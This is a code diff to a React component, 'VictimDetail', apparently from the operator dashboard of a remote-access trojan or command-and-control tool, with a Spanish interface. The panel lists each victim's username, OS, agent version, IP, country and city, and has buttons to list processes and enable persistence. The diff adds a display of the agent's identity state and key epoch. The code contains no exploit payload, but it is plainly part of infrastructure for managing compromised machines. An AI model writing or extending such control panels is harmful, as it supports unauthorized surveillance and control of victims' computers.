@@ -128,6 +128,13 @@ export function VictimDetail({
               <dt className="text-muted">Usuario</dt><dd className="font-mono">{victim.username}</dd>
               <dt className="text-muted">SO</dt><dd className={osTone(victim.os)}>{victim.os} {victim.osVersion} · {victim.arch}</dd>
               <dt className="text-muted">Agente</dt><dd className="font-mono">{victim.agentVersion || '—'}</dd>
+              <dt className="text-muted">Identidad</dt>
+              <dd>
+                <Badge className={cn(victim.identityState === 'confirmed' && 'border-ok/40 text-ok')}>
+                  {victim.identityState ?? 'confirmed'}
+                </Badge>
+                <span className="ml-2 font-mono text-muted">epoch {victim.keyEpoch ?? 1}</span>
+              </dd>
               <dt className="text-muted">Build</dt><dd className="font-mono">{victim.build?.name ?? '—'} v{victim.build?.version ?? '—'}</dd>
               <dt className="text-muted">IP</dt><dd className="font-mono">{victim.ip ?? '—'} <button onClick={() => { copy(victim.ip ?? ''); toast.success('IP copiada'); }}><Copy className="inline h-2.5 w-2.5" /></button></dd>
               <dt className="text-muted">País</dt><dd>{flag(victim.countryCode)} {victim.country ?? '—'} {victim.city ? `· ${victim.city}` : ''}</dd>
@@ -137,6 +144,7 @@ export function VictimDetail({
               <dt className="text-muted">Grupo</dt><dd>{victim.tags.length ? victim.tags.map((tag) => <Badge key={tag} className="mr-1">{tag}</Badge>) : '—'}</dd>
             </dl>
             {!victim.socket ? <p className="mt-3 rounded border border-warn/30 bg-warn/10 p-2 text-2xs text-warn">Sin socket de control: las acciones se rechazarán con <span className="font-mono">agent_offline</span>. El estado online solo refleja el último heartbeat.</p> : null}
+            {victim.identityState && victim.identityState !== 'confirmed' ? <p className="mt-3 rounded border border-warn/30 bg-warn/10 p-2 text-2xs text-warn">Identidad <span className="font-mono">{victim.identityState}</span>: no se ha probado posesión del token. Si no se confirma, la gracia promociona el token pendiente.</p> : null}
             <div className="mt-3 flex flex-wrap gap-1">
               <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('processes')}><TerminalSquare className="h-3 w-3" /> procesos</Button>
               <Button size="sm" variant="secondary" disabled={offline} onClick={() => onAction('persist-on')}><Power className="h-3 w-3" /> persistir</Button>
